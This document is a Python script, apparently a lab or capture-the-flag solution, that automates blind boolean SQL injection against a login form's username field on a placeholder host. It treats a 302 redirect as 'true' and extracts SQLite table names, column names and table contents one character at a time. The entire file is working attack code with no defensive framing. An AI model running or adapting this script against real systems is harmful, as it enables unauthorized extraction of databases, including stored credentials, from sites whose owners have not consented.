import requests

# URL of the target and file name
url="http://site.web"
request_file = "request.txt"


headers = {}
with open(request_file, "r") as f:
    #stores request file as dictionary, removes POST line and params
    for line in f.read().split('\n'):
        keyvalue = line.split(': ', 1)
        if len(keyvalue) < 2:
            continue
        key = keyvalue[0]
        value = keyvalue[1]
        headers[key] = value
print("Headers created")
cookie = dict(USER_ID="12345")

# POST request function
def send_payload(payload):
    params['username'] = payload
    response = requests.post(url=url, headers=headers, data=params, cookies=cookie, allow_redirects=False)
    if response.status_code == 404 or response.status_code == 400:
        print(f"Server responded with status code {response.status_code}")
        exit(1)
    return response

# initials params query. Password param not needed in this injection
params = {"password": "test"}

# find the number of tables
print("Finding the number of tables")
i = 0
while True:
    payload = f"admin' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table')={i}--"
    response = send_payload(payload)
    if response.status_code == 302:
        print(f"There are {i} tables")
        break
    i+=1

# find the name of the table
print("Finding the name of the table")
print("Table name:", end = " ")
table_name = ""
n = 1 # SQL counting starts at 1
while True:
    i = 97 # first lowercase English letter in unicode (decimal)
    while True:
        payload = f"admin' AND unicode(substr((SELECT group_concat(name, ':') FROM sqlite_master WHERE type='table'),{n},1)) = {i}--"
        response = send_payload(payload)
        if response.status_code == 302:
            print(chr(i), end = "")
            table_name += chr(i)
            break
        if i == 123: # last letter
            break
        i += 1
    if i == 123:
        print("\ndone")
        break
    n += 1

#find columns
n = 1 # SQL counting starts at 1
column_names = ""
done = False
print("Column name:", end = " ")
while True:
    i = 97 # first lowercase English letter in unicode (decimal)
    while True:
        payload = f"admin' AND unicode(substr((SELECT group_concat(name, ':') FROM pragma_table_info('{table_name}')),{n},1)) = {i};--"
        response = send_payload(payload)
        if response.status_code == 302:
            print(chr(i), end = "")
            column_names += chr(i)
            break
        elif i == 123:
            i = 58 # set i equal to uncode for colon
            continue
        elif i == 58:
            done = True
            break
        i += 1
    if done:
        print("\ndone")
        break
    n += 1


#find data
n = 1 # SQL counting starts at 1
data_content = ""

print("Table Data")
for column in column_names.split(':'):
    print(f"{column}:")
    column_done = False
    while True:
        i = 33 # first decimal digit in unicode
        while True:
            payload = f"admin' AND unicode(substr((SELECT group_concat({column}, ':') FROM {table_name}), {n}, 1)) = {i};--"
            response = send_payload(payload)
            if response.status_code == 302:
                print(chr(i), end = "")
                break
            elif i == 57: # jump over some symbols in unicode
                i = 64 # first uppercase English letter minus 1.
            elif i == 123:
                i = 58
                continue
            elif i == 58:
                column_done = True
                break
            i += 1
        if column_done:
            print("\n")
            break
        n += 1


print("complete")
